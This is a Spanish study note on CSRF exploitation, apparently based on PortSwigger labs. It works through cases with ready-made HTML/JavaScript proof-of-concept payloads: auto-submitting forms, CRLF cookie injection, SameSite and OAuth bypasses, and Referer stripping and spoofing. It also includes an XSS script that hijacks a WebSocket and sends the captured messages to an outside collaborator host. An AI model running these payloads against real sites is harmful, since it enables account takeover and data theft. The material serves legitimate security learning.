Tags: #csrf #web #burpsuite #get #post #formularios #form #redireccion #referrer #collaborator #token #origin #cookie #sesion 

---
# -Índice:

[[#1. ¿Qué es CSRF?]]
	
[[#2. Requisitos para que exista CSRF]]
	
[[#3. CSRF básico por POST sin token]]
	
[[#4. CSRF por GET sin validación]]
	
[[#5. Tokens CSRF reutilizables / no ligados a sesión]]
	
[[#6. CSRF por sincronización de cookies (csrf + csrfKey)]]
	
[[#7. Method Override (_method=POST)]]
	
[[#8. Bypass SameSite=Strict mediante redirect]]
	
[[#9. SameSite Strict bypass via sibling domain + WebSocket hijacking]]
	
[[#10. Bypass SameSite Lax mediante OAuth]]
	
[[#11. CSRF con validación Referer]]
	
[[#12. CSRF con validación Referer débil]]
	
[[#13. Medidas defensivas correctas]]
	
[[#14. Conclusión]]
	
[[#Referencias]]

---
## 1. ¿Qué es CSRF?

**CSRF (Cross-Site Request Forgery)** es una vulnerabilidad que permite a un atacante forzar a un usuario autenticado a ejecutar acciones no deseadas en una aplicación web en la que confía.

El navegador **incluye automáticamente las cookies de sesión** en las peticiones a un dominio, independientemente de dónde se originen (otra web, email, iframe, etc.). Si la aplicación **no valida correctamente el origen o la intención de la petición**, el servidor no puede distinguir entre una acción legítima del usuario y una acción forzada por un atacante.

### Flujo típico de un ataque CSRF

|Paso|Descripción|
|---|---|
|1|La víctima está autenticada en la web vulnerable|
|2|El atacante induce a la víctima a visitar una web maliciosa|
|3|El navegador envía una petición al sitio vulnerable|
|4|La cookie de sesión se envía automáticamente|
|5|El servidor ejecuta la acción sin validaciones adicionales|

---

## 2. Requisitos para que exista CSRF

Para que una acción sea vulnerable a CSRF:

- Se basa únicamente en **cookies** para autenticar al usuario
    
- La acción **no valida un token CSRF robusto**
    
- No hay comprobaciones efectivas de:
    
    - Origin
        
    - Referer
        
    - SameSite
        
    - Método HTTP
        

---

## 3. CSRF básico por POST sin token

### Caso

Formulario sensible (`change-email`) sin token CSRF.

### PoC

```html
<html>
  <body>
    <form action="https://victima.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="a@a.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

### Explicación

- El navegador envía la cookie de sesión automáticamente
    
- No hay token CSRF
    
- El servidor acepta la acción como legítima
    

---

## 4. CSRF por GET sin validación

### Caso

Endpoint sensible accesible por GET:

```
/my-account/change-email?email=hacked@hacked.com
```

### Explotación

```html
<script>
location="https://victima.net/my-account/change-email?email=pwnd@gg.com";
</script>
```

### Por qué es vulnerable

- No se valida token CSRF
    
- No se valida cookie adicional
    
- GET es aceptado para una acción con efectos
    

---

## 5. Tokens CSRF reutilizables / no ligados a sesión

### Caso

- Token CSRF **no es de un solo uso**
    
- Token **no está ligado a la sesión**
    

### Impacto

Un token válido obtenido de **tu cuenta** puede reutilizarse para atacar **otras cuentas**.

### Ejemplo

```html
<input type="hidden" name="csrf" value="TOKEN_VALIDO" />
```

### Error de diseño

|Token|Problema|
|---|---|
|Estático|Reutilizable|
|No ligado a sesión|Ataques cruzados|
|No invalidado|Persistente|

---

## 6. CSRF por sincronización de cookies (csrf + csrfKey)

### Caso

La aplicación valida:

- Cookie `csrfKey`
    
- Parámetro POST `csrf`
    

Pero **no valida el origen de la cookie**.

### Explotación completa

```html
<html>
  <body>
    <form action="https://victima.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="c@c.com"/>
      <input type="hidden" name="csrf" value="TOKEN_VALIDO"/>
      <input type="submit" />
    </form>

    <img src="https://victima.net/?search=hola%0d%0aSet-Cookie:%20csrfKey=VALOR;%20SameSite=None" onerror="document.forms[0].submit();">
  </body>
</html>
```

### Explicación

- Inyección CRLF permite setear cookies
    
- Cookie + token coinciden
    
- Servidor acepta la acción
    

---

## 7. Method Override (_method=POST)

### Caso

- Endpoint solo acepta POST
    
- Backend soporta override por `_method`
    

### Explotación

```html
<script>
location="https://victima.net/my-account/change-email?email=a@a.com&_method=POST";
</script>
```

### Por qué funciona

- El backend interpreta `_method=POST`
    
- El navegador envía la cookie
    
- Se bypassa CSRF
    

---

## 8. Bypass SameSite=Strict mediante redirect

### Caso

- Cookie SameSite=Strict
    
- Endpoint intermedio con redirect JS
    

### Explotación

```html
<script>
location="https://victima.net/post/comment/confirmation?postId=../my-account/change-email?email%3davcss%40a.com";
</script>
```

### Clave

- El redirect ocurre **dentro del mismo sitio**
    
- SameSite no bloquea cookies
    

---

## 9. SameSite Strict bypass via sibling domain + WebSocket hijacking

### Escenario

- Subdominio vulnerable a XSS
    
- Cookies SameSite=Strict
    
- WebSocket accesible
    

### Script XSS

```html
<script>
const w="wss://victima.net/chat";
const c="https://collaborator";
const s=new WebSocket(w);
s.onopen=()=>s.send("READY");
s.onmessage=e=>fetch(`${c}/?d=${btoa(e.data)}`,{mode:'no-cors'});
</script>
```

### Impacto

- Robo de historial
    
- Credenciales en texto plano
    
- Account takeover
    

---

## 10. Bypass SameSite Lax mediante OAuth

### Escenario

- OAuth recuerda sesión previa
    
- `/social-login` refresca cookie
    

### Explotación

```html
<form action="https://victima.net/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="a@a.com">
</form>
<script>
window.open("https://victima.net/social-login");
setTimeout(()=>document.forms[0].submit(),5000);
</script>
```

### Explicación

- OAuth refresca cookie
    
- SameSite=Lax permite cookie tras navegación
    
- Form se envía con sesión válida
    

---
## 11. CSRF con validación Referer

### Concepto: ¿qué es el header Referer?

El encabezado HTTP **Referer** indica la URL desde la cual se originó una petición HTTP. Algunos servidores lo utilizan como mecanismo de protección CSRF comprobando que:

- El Referer exista
    
- El dominio del Referer coincida con el dominio de la aplicación
    

Ejemplo de Referer legítimo:

`Referer: https://victima.net/my-account`

Este enfoque es **débil por diseño**, ya que el Referer:

- Puede ser eliminado por el navegador
    
- Puede ser modificado por políticas de privacidad
    
- No es obligatorio según el estándar HTTP
    

---
### Caso

El servidor **rechaza la petición si el header Referer existe y no coincide** con su dominio.

Ejemplo de error:

Invalid referer header

Esto ocurre cuando la víctima ejecuta el ataque desde un dominio externo (por ejemplo, el exploit server), y el navegador envía:

Referer: https://exploit-server.net/...

---
### Bypass eliminando el Referer

Si la lógica del backend es:

```
if Referer existe:
	validar dominio
else:
permitir petición
```

Entonces basta con **forzar al navegador a no enviar el Referer**.

---

### Técnica: Referrer Policy = no-referrer

HTML permite definir políticas de envío del Referer mediante la directiva **Referrer-Policy**.

<meta name="referrer" content="no-referrer">

Esta política indica al navegador:

- No enviar el header Referer en ninguna petición
    

---

### PoC completo

```html
<meta name="referrer" content="no-referrer">

<form action="https://victima.net/my-account/change-email" method="POST">
	<input type="hidden" name="email" value="b@c.com">
</form>
<script>
	document.forms[0].submit();
</script>
```


---
### Por qué funciona

- El navegador **no envía Referer**
    
- El backend **no entra en la validación**
    
- La cookie de sesión sí se envía
    
- La acción se ejecuta correctamente
    

---

### Conclusión

Eliminar el Referer es un bypass muy común cuando:

- La validación solo se aplica si el header existe
    
- No hay token CSRF adicional
    

---
## 12. CSRF con validación Referer débil

### Concepto: validación por coincidencia parcial

Algunas aplicaciones implementan una validación incorrecta del Referer comprobando únicamente que **contenga una cadena concreta**, por ejemplo:

```
if Referer contiene "victima.net":
	permitir
else:
	bloquear
```

Este enfoque es inseguro porque:

- No valida el dominio real
    
- No comprueba el esquema
    
- No analiza el host correctamente
    

---
### Caso

El servidor acepta cualquier Referer que **incluya** el dominio esperado, incluso si:

- El dominio real es otro
    
- El dominio esperado aparece como subcadena
    

Ejemplo aceptado erróneamente:

`Referer: https://victima.net.exploit-server.net/`

---
### ¿Qué es Referrer-Policy: unsafe-url?

La política **unsafe-url** indica al navegador:

- Enviar siempre el Referer completo
    
- Incluir path y query string
    
- Incluso en peticiones cross-site
    

<meta name="referrer" content="unsafe-url">

Esto permite al atacante **controlar completamente el valor del Referer**.

---
### Explotación

1. El atacante sirve el payload desde una URL que contiene la cadena esperada:
    
https://victima.net.exploit-server.net/csrf.html

2. El navegador envía el Referer completo:
    
Referer: https://victima.net.exploit-server.net/csrf.html

3. El backend hace match parcial (`victima.net`)
    
4. La validación se considera correcta
    

---
### PoC completo

```html
<head>
<meta name="referrer" content="unsafe-url">
</head>

<form action="https://victima.net/my-account/change-email" method="POST">
	<input type="hidden" name="email" value="bbb@c.com">
</form>

<script>
	document.forms[0].submit();
</script>
```
---

### Impacto

- Bypass total de la protección CSRF
    
- Ejecución de acciones autenticadas
    
- Muy común en aplicaciones legacy
    

---

### Conclusión

La validación de Referer es **frágil y fácil de romper** si no se:

- Parsean correctamente los dominios
    
- Comparan valores exactos
    
- Combinan con tokens CSRF robustos
    

Nunca debe usarse como única defensa.

---

## 13. Medidas defensivas correctas

|Medida|Correcto|
|---|---|
|Token CSRF|Único, por sesión y por request|
|SameSite|Strict + validaciones|
|Referer|Validación estricta|
|Métodos|GET sin efectos|
|OAuth|Revalidación explícita|

---

## 14. Conclusión

CSRF no es una vulnerabilidad trivial. La mayoría de bypasses reales ocurren por:

- Lógicas complejas
    
- Flujos OAuth
    
- Redirects
    
- Subdominios
    
- Implementaciones parciales

---
Un pentester debe analizar **toda la superficie**, no solo la presencia de un token.

---
# Referencias

- Enlace a Portswigger: [Enlace](https://portswigger.net/web-security/csrf)
